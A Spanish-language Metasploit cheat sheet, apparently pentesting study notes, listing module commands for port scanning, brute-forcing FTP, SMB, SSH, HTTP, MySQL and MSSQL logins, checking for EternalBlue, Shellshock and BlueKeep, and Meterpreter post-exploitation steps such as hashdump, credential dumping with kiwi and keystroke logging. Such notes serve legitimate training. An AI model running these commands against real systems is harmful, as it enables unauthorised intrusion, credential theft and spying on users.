# Reconocimiento con Metasploit

Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliary 


* Debemos de crear siempre un espacio de trabajo, para tener un mejor control al momento de enumerar los diferentes puertos. 

## Reconocimiento en la red local con ARP 

```bash 
❯ use auxiliary/scanner/discovery/arp_sweep      # Para usar el exploit
❯ options                                        # Miramos las opciones del exploit y ver lo que es necesario cargar para hacer el barrido en la subred
❯ info 'o' info -d                               # Nos da una breve descripcion de lo que hace el exploit
❯ set RHOSTS ❮IP.0/24❯                     # Colocamos la subred en donde queremos hacer el barrido del ARP
❯ run
❯ hosts                                          # Nos muestra los hosts que ha descubierto en el reconocimiento
❯ services                                       # Nos muestra los servicios, pero para que sea mas efectivo, debemos de pasarle el archivo XML de Nmap
```
## Port Scan

* **Auxiliary Madules:** Son usados para  ejecutar funcionalidades como escanear, descubrir y fuzzear. Podemos usar los módulos auxiliares para ejecutar escaneo de puertos tanto TCP como UDP, así como enumerar información de los servicios como FTP, SSH, HTTP, etc... También, podemos utilizar los módulos auxiliares para descubrir hosts y ejecutar escaneo de puertos en una diferente red o subred desde de obtener el acceso inicial en un sistema target. 

```bash 
# Escaneo de puertos a una sola direccion IP por TCP
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search portscan                             
	❯ use auxiliary/scanner/portscan/tcp          # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
	❯ set PORTS 1-1000
	❯ run 
```

```bash 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search xoda                             
	❯ use exploit/unix/webapp/xoda_file_upload       # Usamos el exploit
	❯ options
	❯ set RHOSTS ❮IP❯                                # Colocamos la IP de la maquina victima
	❯ set TARGETURI /
	❯ exploit                                        
```

```bash 
# Escaneo de puertos a una sola direccion IP por UDP
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search portscan                             
	❯ use auxiliary/scanner/discovery/upd_sweep          # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                                    # Colocamos la IP de la maquina victima
	❯ run 
```

## Puerto 21 FTP 

```bash 
# Mirar la version del protocolo FTP
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search portscan                             
	❯ use auxiliary/scanner/ftp/ftp_version           # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                                 # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Escaneo de autenticacion FTP
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search portscan                             
	❯ use auxiliary/scanner/ftp/ftp_login           # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                               # Colocamos la IP de la maquina victima
	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt       # Agregamos la lista de usuarios 
	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt     # Agregamos la lista de passwds 
	❯ run 

	❯ ftp ❮IP❯         # Una vez encontrado el usuario:passwd podemos ingresar al servicio FTP desde MSF
```

```bash 
# Mirar si al servidor FTP tiene sesion 'Anonymous' 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search portscan                             
	❯ use auxiliary/scanner/ftp/anonymous           # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                               # Colocamos la IP de la maquina victima
	❯ run  

	❯ ftp ❮IP❯                                      # Podemos ingresar como anonimo desde MSF
```

## Puerto 445 SMB 

```bash 
# Enumerar usuarios y passwds con un diccionario de Fuerza Bruta
❯ msfconsole -q                                # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/smb/smb_login     # Usamos el auxiliar
	❯ options
	❯ set RHOSTS ❮IP❯                         # Colocamos la IP de la maquina victima
	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix-users.txt 
	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt
	❯ set VERBOSE false
	❯ run 

	❯ set SMBUser <user>    # si existe un usuario enumerado se coloca este comando, el usuario más común es 'administrator'

# Diccionarios 
/usr/share/wordlists/metasploit/unix_passwords.txt
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

```bash 
# Miramos la version del SMB
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search smb                                  
	❯ use auxiliary/scanner/smb/smb_version       # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Para saber si soporta SMB2
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/smb/smb2              # Usamos el auxiliar
	❯ options
	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Para enumerar los usuarios que existen en el SMB
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/smb/smb_enumusers     # Usamos el auxiliar
	❯ options
	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Para enumerar los directorios que existen en el SMB
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/smb/smb_enumshares    # Usamos el auxiliar
	❯ options
	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Para enumerar los nombres de los 'pipes' que existen en el SMB
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/smb/pipe_auditor      # Usamos el auxiliar
	❯ options
	❯ set smbuser <admin>
	❯ set smbpass <passwd>
	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
	❯ run 
```

## Puerto 80 HTTP

```bash 
# Miramos la version del HTTP
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/http/http_version      # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Miramos la cabecera del HTTP
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/http/http_header      # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Enumeracion de robots 'bot', donde nos muestra algunos directorios 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/http/robots_txt        # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Brute Force a los Dir desde la raiz
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/http/dir_scanner        # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                               # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Escaner de archivos en el HTTP desde la raiz, como: php, txt, etc...
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/http/files_dir         # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Enumeracion de directorios
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/http/brute_dirs        # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Enumerar usuarios y passwds con un diccionario de Fuerza Bruta
❯ msfconsole -q                                               # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/http/http_login                    # Usamos el auxiliar
	❯ options
	❯ set AUTH_URI /secure/                                  # Directorio donde nos autenticamos
	❯ unset USERPASS_FILE                                    # Quitas la ruta  
	❯ set RHOSTS ❮IP❯                                        # Colocamos la IP de la maquina victima
	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt
	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	❯ set VERBOSE false
	❯ run 


	❯ set USER_FILE /root/file.txt                            # Si ya tenemos al usuario lo agregamos en un archivo .txt 
	❯ set VERBOSE true                                        
```

```bash 
# Enumeracion de Apache a los usuarios con Fuerza Bruta
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/http/apache_userdir_enum        # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                                       # Colocamos la IP de la maquina victima
	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
	❯ run 
```

## Tomcat

```bash 
# Saber el usuario y passowrd del login para ingresar al 'manager' en Tomcat
❯ msfconsole -q                                       # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/http/tomcat_mgr_login    # Usamos el auxiliar
	❯ options
	❯ set RHOSTS ❮IP❯                                # Colocamos la IP de la maquina victima
	❯ set RPORT 8080                                 # Colocamos el puerto de la maquina victima
	❯ run 
```

## EternalBlue (CVE-2017-0144)

```bash 
# Saber si Windows es vulnerable al EternalBlue
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/smb/smb_ms17_010      # Usamos el auxiliar
	❯ options
	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
	❯ run 
```

## Puerto 22 SSH

```bash 
# Miramos la version del SSH
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/ssh/ssh_version        # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Enumerar usuarios y passwds con un diccionario de Fuerza Bruta
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/ssh/ssh_login         # Usamos el auxiliar
	❯ options
	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
	❯ set STOP_ON_SUCCESS true
	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
	❯ set VERBOSE true
	❯ run 

	❯ sessions                    # Miramos las sesiones 
	❯ sessions 1                  # Ingresamos en la sesion creada 
```

```bash 
# Enumeramos a los usuarios 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/ssh/ssh_enumusers      # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
	❯ run 
```

## Puerto 3389/3333 RDP

```bash 
# Identifica si el 'endpoint' esta usando RDP
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/rdp/rdp_scanner        # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯             # Colocamos la IP de la maquina victima
	❯ set RPORT 3333              # Configuramos el puerto de RDP en caso que no use el de default 3389
	❯ run 
```

## Puerto 161 SNMP 

```bash 
# Escaner del login 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/snmp/snmp_login     # Usar el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                           # Colocar la IP de la maquina victima
	❯ run 
```

## Puerto 25 SMTP o (465, 587)

```bash 
# Miramos la version del SMTP
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/smtp/smtp_version      # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Enumeramos cuentas de usuarios por Brute Force 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/admin/smtp/smtp_enum                  # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                                     # Colocamos la IP de la maquina victima
	❯ run
```

## Puerto 3306 MYSQL 

```bash 
# Miramos la version del MySQL
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/mysql/mysql_version      # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                                # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Enumerar passwds con un diccionario de Fuerza Bruta para un usuario especifico, en este caso el usuario 'root'
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/mysql/mysql_login     # Usamos el auxiliar
	❯ options
	❯ set USERNAME root
	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	❯ set STOP_ON_SUCCESS true
	❯ setg RHOSTS ❮IP❯                            # Colocamos la IP de la maquina victima
	❯ set verbose false
	❯ run 
```

```bash 
# Enumeramos informacion de la base de datos, pero necesitamos las credenciales validas para poder utilizarlo 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/admin/mysql/mysql_enum                  # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                                       # Colocamos la IP de la maquina victima
	❯ set USERNAME root
	❯ set PASSWORD ""                                       # Colocamos la Passwd valida 
	❯ run
```

```bash 
# Ejecutar SQL Querys, podemos interactuar con la DB, pero debemos de tener credenciales validas 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/admin/mysql/mysql_sql                  # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                                      # Colocamos la IP de la maquina victima
	❯ set USERNAME root
	❯ set PASSWORD ""                                      # Colocamos la Passwd valida 
	❯ set SQL show databases;                              # Colocamos una Query con estructura valida 
	❯ run
```

```bash 
# Mostrar las bases de datos 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/mysql/mysql_schemadump             # Usamos el auxiliar 
	❯ options
	❯ setg RHOSTS ❮IP❯                                         # Colocamos la IP de la maquina victima
	❯ set USERNAME root
	❯ set PASSWORD ""
	❯ run
```

```bash 
# Nos dice que directorios tienen privilegios de escritura 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/mysql/mysql_writable_dirs        # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                                        # Colocamos la IP de la maquina victima
	❯ set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
	❯ set VERBOSE false
	❯ advanced                                               # Mirar las opciones avanzadas
	❯ set USERNAME root
	❯ set PASSWORD ""
	❯ run
```

```bash 
# Enumeramos los dir sensibles de lectura   
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/mysql/mysql_file_enum            # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                                        # Colocamos la IP de la maquina victima
	❯ set file_list /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
	❯ set USERNAME root
	❯ set PASSWORD ""
	❯ run
```

```bash 
# Obtener los hashes de los diferentes usuarios 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/mysql/mysql_hashdump             # Usamos el auxiliar 
	❯ options
	❯ setg RHOSTS ❮IP❯                                       # Colocamos la IP de la maquina victima
	❯ set USERNAME root
	❯ set PASSWORD ""
	❯ run 
```

```bash 
❯ hosts             # Direccion IP del hosts usado 
❯ services          # Muestra informacion del host, puerto, protocolo, nombre, etc...
❯ loot              # Mas informacion recopilada del host 
❯ creds             # Muestras las credneciales obtenidas durante la enumeracion 
```

## Puerto 1433 MSSQL

```bash 
# Enumerar passwds con un diccionario de Fuerza Bruta para un usuario especifico
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/mssql/mssql_login         # Usamos el auxiliar
	❯ options
	❯ set user_file /root/Desktop/wordlists/common_users.txt
	❯ set pass_file /root/Desktop/wordlists/100-common-passwords.txt
	❯ setg RHOSTS ❮IP❯                                # Colocamos la IP de la maquina victima
	❯ set verbose false
	❯ run 
```

```bash 
# Enumeramos la configuracion 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/admin/mssql/mssql_enum            # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                                 # Colocamos la IP de la maquina victima
	❯ run
```

```bash 
# Enumeramos todos los loggins
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/admin/mssql/mssql_enum_sql_logins       # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                                       # Colocamos la IP de la maquina victima
	❯ run
```

```bash 
# Enumeramos los usuarios disponibles en el sistema
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/admin/mssql/mssql_enum_domain_accounts       # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                                            # Colocamos la IP de la maquina victima
	❯ run
```

```bash 
# Podemos ejecutar comandos en la base de datos   
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/admin/mssql/mssql_exec                  # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                                       # Colocamos la IP de la maquina victima
	❯ set cmd whoami                                        # Colocamos el comando a ejecutar 
	❯ run
```

## Shellshock (CVE-2014-6271)

```bash 
# Para confirmar si es vulnerable a Shellshock
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/http/apache_mod_cgi_bash_env     # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                                        # Colocamos la IP de la maquina victima
	❯ run 
```

## BlueKeep (CVE-2019-0708)

* Servicio 'ms-wbt-server'

```bash 
# Identifica si la maquina victima es vulnerable al BlueKeep
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/rdp/cve_2019_0708_bluekeep        # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS ❮IP❯                                         # Colocamos la IP de la maquina victima
	❯ run 
```

------

## Comandos específicos 

Dentro de la maquina podemos hacer algunos comandos específicos
```bash 

❯ load powershell            # Cargamos el modulo powershell
❯ powershell_shell           # Nos carga una powershell 
❯ getuid                     # Nos muestra el nombre del servidor o usuario en Windows  

❯ ps                         # Mirar los procesos existentes
❯ hashdump                   # Para dumpear los hashes del sistema, crackearlos y hacer pass-the-hash
❯ load kiwi                  # Cargamos el modulo kiwi para poder usar 'creds_all'
❯ creds_all                  # Recopila informacion de credenciales de todo tipo
```

## Comandos de Meterpreter dentro de la maquina victima.

```bash 
❯ help                       # Miramos el panel de ayuda
❯ screenshot                 # Captura de pantalla del equipo
❯ load espia                 # Cargamos el modulo 'espia' y asi poder usar el 'screengrab, screenshare'
❯ screenshare                # Mirar el escritorio del usuario remoto en tiempo real 
❯ uictl disable <mouse>      # Podemos desabilitar (disable, enable) algunos componentes de interface de la maquina victima como: mouse, keyboard, all 
❯ keyscan_start              # Sniffer de pulsaciones del teclado
❯ keyscan_dump               # Nos muestra lo que capturo por el teclado con el comando anterior
❯ keyscan_stop               # Para el sniffer de pulsaciones del teclado


```